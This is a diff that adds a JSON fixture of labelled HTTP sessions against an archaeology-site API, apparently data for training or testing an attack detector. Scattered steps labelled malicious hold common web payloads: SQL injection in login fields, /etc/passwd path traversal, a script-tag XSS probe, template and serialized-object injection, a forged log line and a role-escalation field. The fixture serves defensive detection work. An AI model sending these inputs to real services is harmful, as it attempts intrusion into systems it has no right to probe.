@@ -1,0 +1,6321 @@
+[
+  {
+    "session_id": "sess101",
+    "client_ip": "192.0.2.10",
+    "steps": [
+      {
+        "id": "sess101-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "aris",
+          "password": "secretpassword1"
+        },
+        "note": "The user starts a new working session by authenticating."
+      },
+      {
+        "id": "sess101-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token101"
+        },
+        "body": null,
+        "note": "The client retrieves the current user profile."
+      },
+      {
+        "id": "sess101-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token101"
+        },
+        "body": null,
+        "note": "The user lists their own owned stratigraphic units."
+      },
+      {
+        "id": "sess101-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token101"
+        },
+        "body": null,
+        "note": "The user opens the first active stratum object."
+      },
+      {
+        "id": "sess101-s05",
+        "label": "benign",
+        "method": "PATCH",
+        "path": "/strata/stratum-101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token101",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.4,
+          "soilConsistency": "loam"
+        },
+        "note": "The user updates the layer depth and soil consistency of the active stratum."
+      },
+      {
+        "id": "sess101-s06",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token101"
+        },
+        "body": null,
+        "note": "The user switches back to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess102",
+    "client_ip": "192.0.2.11",
+    "steps": [
+      {
+        "id": "sess102-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
+        },
+        "body": {
+          "username": "maya",
+          "password": "secretpassword2"
+        },
+        "note": "The user authenticates using an old legacy browser client header."
+      },
+      {
+        "id": "sess102-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/trench-sites",
+        "query": {
+          "region": "Galilee"
+        },
+        "headers": {
+          "Authorization": "Bearer token102"
+        },
+        "body": null,
+        "note": "The client lists all public excavation trench sites filtered by region."
+      },
+      {
+        "id": "sess102-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/trench-sites/site-5",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token102"
+        },
+        "body": null,
+        "note": "The client gets details for a specific public trench site."
+      },
+      {
+        "id": "sess102-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token102"
+        },
+        "body": null,
+        "note": "The user lists their stratigraphic units."
+      },
+      {
+        "id": "sess102-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token102"
+        },
+        "body": null,
+        "note": "The user opens a specific stratigraphic unit."
+      }
+    ]
+  },
+  {
+    "session_id": "sess103",
+    "client_ip": "192.0.2.12",
+    "steps": [
+      {
+        "id": "sess103-s01",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "admin' OR '1'='1",
+          "password": "any"
+        },
+        "note": "The first step attempts a query injection in the authentication payload."
+      },
+      {
+        "id": "sess103-s02",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "aris",
+          "password": "secretpassword1"
+        },
+        "note": "The user retries authentication correctly after the failed attempt."
+      },
+      {
+        "id": "sess103-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token103"
+        },
+        "body": null,
+        "note": "The user lists strata after logging in."
+      },
+      {
+        "id": "sess103-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-103",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token103"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess103-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-104",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token103"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess104",
+    "client_ip": "192.0.2.13",
+    "steps": [
+      {
+        "id": "sess104-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "dan",
+          "password": "secretpassword4"
+        },
+        "note": "The user authenticates to begin the session."
+      },
+      {
+        "id": "sess104-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token104"
+        },
+        "body": null,
+        "note": "The user lists their owned strata."
+      },
+      {
+        "id": "sess104-s03",
+        "label": "suspicious_benign",
+        "method": "PATCH",
+        "path": "/strata/stratum-301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token104",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 1.5,
+          "soilConsistency": "sandy\n clay"
+        },
+        "note": "The update contains a harmless newline that continues a sentence in the description."
+      },
+      {
+        "id": "sess104-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token104"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess105",
+    "client_ip": "192.0.2.14",
+    "steps": [
+      {
+        "id": "sess105-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "elena",
+          "password": "secretpassword5"
+        },
+        "note": "The user establishes a working session."
+      },
+      {
+        "id": "sess105-s02",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/artifacts/artifact-999?extra=../../../../etc/passwd",
+        "query": {
+          "extra": "../../../../etc/passwd"
+        },
+        "headers": {
+          "Authorization": "Bearer token105"
+        },
+        "body": null,
+        "note": "The middle of the session includes a directory traversal payload in query parameters."
+      },
+      {
+        "id": "sess105-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token105"
+        },
+        "body": null,
+        "note": "The user checks a legitimate artifact object."
+      },
+      {
+        "id": "sess105-s04",
+        "label": "benign",
+        "method": "PATCH",
+        "path": "/artifacts/artifact-501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token105",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "material": "bronze",
+          "notes": "Cleaned and measured."
+        },
+        "note": "The user updates the artifact record."
+      },
+      {
+        "id": "sess105-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token105"
+        },
+        "body": null,
+        "note": "The user views another previously used artifact object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess106",
+    "client_ip": "192.0.2.15",
+    "steps": [
+      {
+        "id": "sess106-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "gali",
+          "password": "secretpassword6"
+        },
+        "note": "The user logs in to begin work."
+      },
+      {
+        "id": "sess106-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token106"
+        },
+        "body": null,
+        "note": "The user lists their strata."
+      },
+      {
+        "id": "sess106-s03",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token106",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "siteId": "site-1",
+          "unitName": "Area A",
+          "layerDepth": 1.2,
+          "harmlessField": "value"
+        },
+        "note": "The request includes a harmless extra field not defined in the contract schema."
+      },
+      {
+        "id": "sess106-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token106"
+        },
+        "body": null,
+        "note": "The user opens the newly created stratum object."
+      },
+      {
+        "id": "sess106-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token106"
+        },
+        "body": null,
+        "note": "The user inspects another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess107",
+    "client_ip": "192.0.2.16",
+    "steps": [
+      {
+        "id": "sess107-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "ziv",
+          "password": "secretpassword7"
+        },
+        "note": "The user authenticates successfully."
+      },
+      {
+        "id": "sess107-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token107"
+        },
+        "body": null,
+        "note": "The user lists their strata."
+      },
+      {
+        "id": "sess107-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token107"
+        },
+        "body": null,
+        "note": "The user opens stratum 701."
+      },
+      {
+        "id": "sess107-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token107",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 3.0,
+          "soilConsistency": "<script>alert(1)</script>"
+        },
+        "note": "A late step in the session includes a browser-executed code injection attempt in soil consistency."
+      },
+      {
+        "id": "sess107-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-702",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token107"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object after the malicious attempt."
+      }
+    ]
+  },
+  {
+    "session_id": "sess108",
+    "client_ip": "192.0.2.17",
+    "steps": [
+      {
+        "id": "sess108-s01",
+        "label": "suspicious_benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "tamar",
+          "password": "secretpassword8",
+          "comment": "Authentication endpoint."
+        },
+        "note": "The request contains a technical word mentioned in a comment field."
+      },
+      {
+        "id": "sess108-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/users/me",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token108"
+        },
+        "body": null,
+        "note": "The user verifies their user profile."
+      },
+      {
+        "id": "sess108-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token108"
+        },
+        "body": null,
+        "note": "The user lists their strata."
+      },
+      {
+        "id": "sess108-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token108"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess109",
+    "client_ip": "192.0.2.18",
+    "steps": [
+      {
+        "id": "sess109-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "omer",
+          "password": "secretpassword9"
+        },
+        "note": "The user logs into the system."
+      },
+      {
+        "id": "sess109-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token109"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess109-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata/stratum-901/artifacts",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token109",
+          "X-Forwarded-For": "127.0.0.1"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. The request is a normal read. X-Forwarded-For is not trusted."
+      },
+      {
+        "id": "sess109-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token109"
+        },
+        "body": null,
+        "note": "The user views the stratum object."
+      },
+      {
+        "id": "sess109-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token109"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess110",
+    "client_ip": "192.0.2.19",
+    "steps": [
+      {
+        "id": "sess110-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "noa",
+          "password": "secretpassword10"
+        },
+        "note": "The user authenticates normally."
+      },
+      {
+        "id": "sess110-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-1001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token110"
+        },
+        "body": null,
+        "note": "The user views an artifact object."
+      },
+      {
+        "id": "sess110-s03",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata/stratum-1001/artifacts",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token110",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "artifactType": "${7*7}",
+          "material": "flint"
+        },
+        "note": "The artifact addition payload includes a template expression."
+      },
+      {
+        "id": "sess110-s04",
+        "label": "benign",
+        "method": "PATCH",
+        "path": "/artifacts/artifact-1001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token110",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "material": "flint",
+          "notes": "Verified authentic."
+        },
+        "note": "The user updates the artifact record."
+      },
+      {
+        "id": "sess110-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-1002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token110"
+        },
+        "body": null,
+        "note": "The user switches back to another previously used artifact object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess111",
+    "client_ip": "192.0.2.20",
+    "steps": [
+      {
+        "id": "sess111-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "ron",
+          "password": "secretpassword11"
+        },
+        "note": "The user starts the session."
+      },
+      {
+        "id": "sess111-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token111"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess111-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token111"
+        },
+        "body": null,
+        "note": "The user opens stratum 1101."
+      },
+      {
+        "id": "sess111-s04",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token111",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "siteId": "site-1",
+          "unitName": "Unit X",
+          "layerDepth": 1.0,
+          "serializedObject": "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}"
+        },
+        "note": "The stratum creation payload includes a serialized object string."
+      },
+      {
+        "id": "sess111-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token111"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess112",
+    "client_ip": "192.0.2.21",
+    "steps": [
+      {
+        "id": "sess112-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "shira",
+          "password": "secretpassword12"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess112-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token112"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess112-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token112"
+        },
+        "body": null,
+        "note": "The user opens stratum 1201."
+      },
+      {
+        "id": "sess112-s04",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-1201",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token112",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 2.1,
+          "soilConsistency": "clay\n2026-10-28 11:07:00 [INFO] Access granted"
+        },
+        "note": "The update payload includes a newline plus a log stamp."
+      },
+      {
+        "id": "sess112-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1202",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token112"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess113",
+    "client_ip": "192.0.2.22",
+    "steps": [
+      {
+        "id": "sess113-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "amit",
+          "password": "secretpassword13"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess113-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token113"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess113-s03",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/dashboard",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token113"
+        },
+        "body": null,
+        "note": "The user accesses an admin path that is not in the contract."
+      },
+      {
+        "id": "sess113-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1301",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token113"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess113-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1302",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token113"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess114",
+    "client_ip": "192.0.2.23",
+    "steps": [
+      {
+        "id": "sess114-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "yossi",
+          "password": "secretpassword14"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess114-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token114"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess114-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata/stratum-9999",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token114"
+        },
+        "body": null,
+        "note": "Data error: relabeled from malicious. One authenticated GET. Words in the id are not evidence the object belongs to someone else."
+      },
+      {
+        "id": "sess114-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1401",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token114"
+        },
+        "body": null,
+        "note": "The user opens their own stratum object."
+      },
+      {
+        "id": "sess114-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1402",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token114"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess115",
+    "client_ip": "192.0.2.24",
+    "steps": [
+      {
+        "id": "sess115-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "dana",
+          "password": "secretpassword15"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess115-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token115"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess115-s03",
+        "label": "malicious",
+        "method": "PATCH",
+        "path": "/strata/stratum-1501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token115",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "layerDepth": 1.8,
+          "role": "admin"
+        },
+        "note": "The update body includes a privilege field that is not in the contract."
+      },
+      {
+        "id": "sess115-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1501",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token115"
+        },
+        "body": null,
+        "note": "The user checks the stratum details."
+      },
+      {
+        "id": "sess115-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1502",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token115"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess116",
+    "client_ip": "192.0.2.25",
+    "steps": [
+      {
+        "id": "sess116-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "lior",
+          "password": "secretpassword16"
+        },
+        "note": "The user starts the session."
+      },
+      {
+        "id": "sess116-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token116"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess116-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1601",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token116"
+        },
+        "body": null,
+        "note": "The user opens stratum 1601."
+      },
+      {
+        "id": "sess116-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1602",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token116"
+        },
+        "body": null,
+        "note": "The user returns to stratum 1602."
+      }
+    ]
+  },
+  {
+    "session_id": "sess117",
+    "client_ip": "192.0.2.26",
+    "steps": [
+      {
+        "id": "sess117-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "kfir",
+          "password": "secretpassword17"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess117-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/trench-sites",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token117"
+        },
+        "body": null,
+        "note": "The user lists public trench sites."
+      },
+      {
+        "id": "sess117-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/trench-sites/site-1",
+        "query": {
+          "note": "User's query with an apostrophe ' reference."
+        },
+        "headers": {
+          "Authorization": "Bearer token117"
+        },
+        "body": null,
+        "note": "The query parameter contains an apostrophe in descriptive text."
+      },
+      {
+        "id": "sess117-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token117"
+        },
+        "body": null,
+        "note": "The user lists their strata."
+      },
+      {
+        "id": "sess117-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1701",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token117"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess118",
+    "client_ip": "192.0.2.27",
+    "steps": [
+      {
+        "id": "sess118-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "revital",
+          "password": "secretpassword18"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess118-s02",
+        "label": "malicious",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "admin' UNION SELECT null--",
+          "password": "pwd"
+        },
+        "note": "The session begins with a query injection payload in the login body."
+      },
+      {
+        "id": "sess118-s03",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "revital",
+          "password": "secretpassword18"
+        },
+        "note": "The user authenticates properly after the injection attempt."
+      },
+      {
+        "id": "sess118-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token118"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess118-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1801",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token118"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess119",
+    "client_ip": "192.0.2.28",
+    "steps": [
+      {
+        "id": "sess119-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "galit",
+          "password": "secretpassword19"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess119-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token119"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess119-s03",
+        "label": "suspicious_benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {
+          "status": "active\npending"
+        },
+        "headers": {
+          "Authorization": "Bearer token119"
+        },
+        "body": null,
+        "note": "The query parameter includes a newline that continues a sentence."
+      },
+      {
+        "id": "sess119-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1901",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token119"
+        },
+        "body": null,
+        "note": "The user opens a stratum object."
+      },
+      {
+        "id": "sess119-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-1902",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token119"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess120",
+    "client_ip": "192.0.2.29",
+    "steps": [
+      {
+        "id": "sess120-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "itay",
+          "password": "secretpassword20"
+        },
+        "note": "The user logs in."
+      },
+      {
+        "id": "sess120-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token120"
+        },
+        "body": null,
+        "note": "The user lists strata."
+      },
+      {
+        "id": "sess120-s03",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2001",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token120"
+        },
+        "body": null,
+        "note": "The user opens stratum 2001."
+      },
+      {
+        "id": "sess120-s04",
+        "label": "malicious",
+        "method": "GET",
+        "path": "/admin/config",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token120"
+        },
+        "body": null,
+        "note": "The user accesses an admin path not defined in the contract."
+      },
+      {
+        "id": "sess120-s05",
+        "label": "benign",
+        "method": "GET",
+        "path": "/strata/stratum-2002",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token120"
+        },
+        "body": null,
+        "note": "The user returns to another previously used stratum object."
+      }
+    ]
+  },
+  {
+    "session_id": "sess121",
+    "client_ip": "192.0.2.30",
+    "steps": [
+      {
+        "id": "sess121-s01",
+        "label": "benign",
+        "method": "POST",
+        "path": "/sessions",
+        "query": {},
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "username": "michal",
+          "password": "secretpassword21"
+        },
+        "note": "The user authenticates."
+      },
+      {
+        "id": "sess121-s02",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-2101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token121"
+        },
+        "body": null,
+        "note": "The user views an artifact."
+      },
+      {
+        "id": "sess121-s03",
+        "label": "suspicious_benign",
+        "method": "PATCH",
+        "path": "/artifacts/artifact-2101",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token121",
+          "Content-Type": "application/json"
+        },
+        "body": {
+          "material": "ceramic",
+          "extraInfo": "None"
+        },
+        "note": "The request includes a harmless extra field not in the schema."
+      },
+      {
+        "id": "sess121-s04",
+        "label": "benign",
+        "method": "GET",
+        "path": "/artifacts/artifact-2102",
+        "query": {},
+        "headers": {
+          "Authorization": "Bearer token121"
+        },
+        "body": null,
+        "note": "The user switches to another previously used artifact."
+      }
